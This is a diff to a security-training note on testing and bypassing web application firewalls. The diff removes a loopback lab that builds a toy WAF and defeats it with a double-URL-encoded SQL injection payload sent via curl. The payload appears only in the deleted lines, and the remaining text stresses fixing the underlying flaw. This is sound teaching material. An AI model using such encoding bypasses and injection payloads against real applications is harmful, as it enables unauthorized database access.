@@ -1,7 +1,7 @@
 ---
 title: "WAF Testing & Bypass Methodology"
 aliases: ["WAF Testing", "Edge Control Validation", "WAF Bypass"]
-tags: [tree/offensive, cyber/offensive/web/http/waf, type/technique, level/operator]
+tags: [tree/offensive, cyber/offensive/web/http/waf, type/technique, difficulty/medium]
 Domain: "[[HTTP Architecture & Advanced Web Attacks]]"
 Color: "#DC143C"
 ---
@@ -14,7 +14,7 @@ Color: "#DC143C"
 ## Parent Learning Order
 Server-Side Request Forgery -> HTTP Request Smuggling -> Web Cache Attacks -> WAF Testing & Bypass Methodology
 
-## Start at Zero: Testing the Filter, Not Just the App
+## Testing the Filter, Not Just the App
 
 A **Web Application Firewall (WAF)** sits in front of an application and inspects requests, blocking those matching attack signatures — SQL injection patterns, XSS payloads, path traversal. It is a valuable *layer*, but it is a signature-matcher, not an understanding of the application, so it has the same fundamental limitation as any signature system: it catches what it has a rule for and misses what it does not. WAF testing has two goals: verify the WAF *works* (blocks known attacks), and — critically — determine whether it can be *bypassed*, because a WAF that is trivially bypassed provides false assurance.
 
@@ -71,7 +71,7 @@ flowchart TD
     X --> R["Finding: WAF bypassable AND app vulnerable"]
 ```
 
-## Failure Modes and Interpretation
+## Why 'protected by WAF' is not a finding
 
 - **WAF = fixed, the myth.** Reporting "protected by WAF" without bypass testing is the core error — the vulnerability behind the WAF is unpatched, and a bypass exposes it. Always test bypasses.
 - **Bypass ≠ exploit.** A payload passing the WAF is only impactful if the app is genuinely vulnerable to it. A WAF bypass against a non-vulnerable app is a WAF weakness, not an app finding — classify precisely.
@@ -87,98 +87,13 @@ flowchart TD
 - **WAF tuning and updates** matter — signatures must cover the encoding neighborhood, and the WAF must be updated as bypass techniques evolve.
 - **Detection**: WAF logs of blocked attacks are valuable telemetry (they show attackers probing), and a spike in near-miss encoded payloads is the signature of someone hunting a bypass — the WAF becomes a sensor even when it is the thing being tested.
 
-## Authorized Lab: Bypass a WAF You Build
+## Summary
 
-> [!info] Runs on one Linux machine — builds a simple signature-based "WAF" in front of an app, then bypasses it
-> Loopback, benign canary payload. Step 5 removes it.
+You should now be able to:
 
-### Step 1 — Build a WAF that blocks a SQLi signature but decodes only once
-
-```bash
-cat > /tmp/waf.py << 'EOF'
-import http.server, urllib.parse, re
-class H(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        raw_q = urllib.parse.urlparse(self.path).query
-        q = urllib.parse.parse_qs(raw_q).get("q",[""])[0]      # WAF decodes ONCE
-        # WAF signature: block obvious SQLi keywords (case-insensitive)
-        if re.search(r"(?i)\b(union|select|or\s+1=1)\b", q):
-            self.send_response(403); self.end_headers(); self.wfile.write(b"BLOCKED by WAF"); return
-        # the "app" behind it decodes AGAIN (the normalization mismatch)
-        app_input = urllib.parse.unquote(q)
-        if re.search(r"(?i)or\s+1=1", app_input):
-            self.send_response(200); self.end_headers(); self.wfile.write(b"APP: query executed -> CANARY-SQLI"); return
-        self.send_response(200); self.end_headers(); self.wfile.write(b"APP: normal result")
-    def log_message(self,*a): pass
-http.server.HTTPServer(("127.0.0.1",8113),H).serve_forever()
-EOF
-python3 /tmp/waf.py &>/dev/null &
-sleep 1; echo "WAF+app up on 127.0.0.1:8113 (WAF decodes once, app decodes twice)"
-```
-
-```text
-WAF+app up on 127.0.0.1:8113 (WAF decodes once, app decodes twice)
-```
-
-### Step 2 — Confirm the WAF blocks the plain payload
-
-```bash
-curl -s "http://127.0.0.1:8113/?q=$(python3 -c "import urllib.parse;print(urllib.parse.quote(\"' OR 1=1--\"))")"
-```
-
-```text
-BLOCKED by WAF
-```
-
-The obvious SQLi is blocked (403 body) — the WAF works against the plain payload. A naive test stops here and reports "protected."
-
-### Step 3 — Bypass via double-encoding (the finding)
-
-```bash
-# double-encode: WAF decodes once (sees encoded garbage, no match), app decodes again (sees the SQLi)
-payload="' OR 1=1--"
-double=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(urllib.parse.quote(sys.argv[1])))" "$payload")
-curl -s "http://127.0.0.1:8113/?q=$double"
-```
-
-```text
-APP: query executed -> CANARY-SQLI
-```
-
-The double-encoded payload **passed the WAF and executed at the app** (`CANARY-SQLI`). The WAF decoded once and saw harmless-looking encoded text; the app decoded again and got the live SQLi. That normalization mismatch is the bypass — and it proves both that the WAF is bypassable *and* that the app behind it is genuinely vulnerable.
-
-### Step 4 — State the two-part finding
-
-```bash
-echo "Finding 1 (WAF): bypassable via double-encoding due to decode-count mismatch with the app."
-echo "Finding 2 (App): the underlying SQLi is real — the WAF was only hiding it."
-echo "Fix: parameterize the query (fix the app); align WAF/app normalization (harden the WAF). WAF alone is not a fix."
-```
-
-```text
-Finding 1 (WAF): bypassable via double-encoding due to decode-count mismatch with the app.
-Finding 2 (App): the underlying SQLi is real — the WAF was only hiding it.
-Fix: parameterize the query (fix the app); align WAF/app normalization (harden the WAF). WAF alone is not a fix.
-```
-
-### Step 5 — Cleanup
-
-```bash
-kill %1 2>/dev/null; rm -f /tmp/waf.py; wait 2>/dev/null
-curl -s -o /dev/null -w "waf gone: %{http_code}\n" --max-time 2 http://127.0.0.1:8113/ 2>&1 | grep -o 'gone.*' || echo "waf gone: connection refused"
-```
-
-```text
-waf gone: connection refused
-```
-
-**What you should now be able to do:** fingerprint and confirm a WAF, bypass it via the encoding/normalization neighborhood, distinguish a WAF bypass from an app exploit, and explain why a WAF is defense-in-depth rather than a fix.
-
-## Crook → Operator → Root Checkpoint
-
-- **Crook:** Explain why a WAF is a signature-matcher with the same catch-the-known/miss-the-novel limit as any signature system, and why it is not a fix.
-- **Operator:** Fingerprint a WAF, confirm it blocks the obvious, bypass it via encoding/normalization mismatch, and verify the payload also works against the app.
-- **Root:** Explain why the WAF/app normalization mismatch is a parser-discrepancy bypass, why fixing the underlying vulnerability (not the WAF) is the durable control, and how a positive security model resists bypass.
+- Explain why a WAF is a signature-matcher with the same catch-the-known/miss-the-novel limit as any signature system, and why it is not a fix.
+- Fingerprint a WAF, confirm it blocks the obvious, bypass it via encoding/normalization mismatch, and verify the payload also works against the app.
+- Explain why the WAF/app normalization mismatch is a parser-discrepancy bypass, why fixing the underlying vulnerability (not the WAF) is the durable control, and how a positive security model resists bypass.
 
 ---
 > 🔼 Up: [[HTTP Architecture & Advanced Web Attacks]]
